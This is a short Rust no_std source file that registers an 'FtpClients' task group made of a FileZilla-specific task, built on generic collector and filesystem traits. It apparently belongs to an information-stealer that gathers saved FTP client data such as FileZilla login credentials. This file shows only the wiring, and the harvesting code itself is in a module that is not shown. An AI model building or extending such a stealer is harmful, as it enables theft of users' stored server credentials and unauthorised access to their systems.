#![no_std]
#![allow(unsafe_op_in_unsafe_fn)]

extern crate alloc;
mod filezilla;

use crate::filezilla::FileZillaTask;
use alloc::borrow::ToOwned;
use alloc::vec;
use collector::Collector;
use filesystem::FileSystem;
use tasks::{CompositeTask, Task, composite_task, impl_composite_task_runner};

pub struct FtpTask<C: Collector, F: FileSystem> {
    inner: CompositeTask<C, F>,
}

impl<C: Collector, F: FileSystem> Default for FtpTask<C, F> {
    fn default() -> Self {
        Self {
            inner: composite_task!(FileZillaTask),
        }
    }
}

impl_composite_task_runner!(FtpTask<C, F>, "FtpClients");
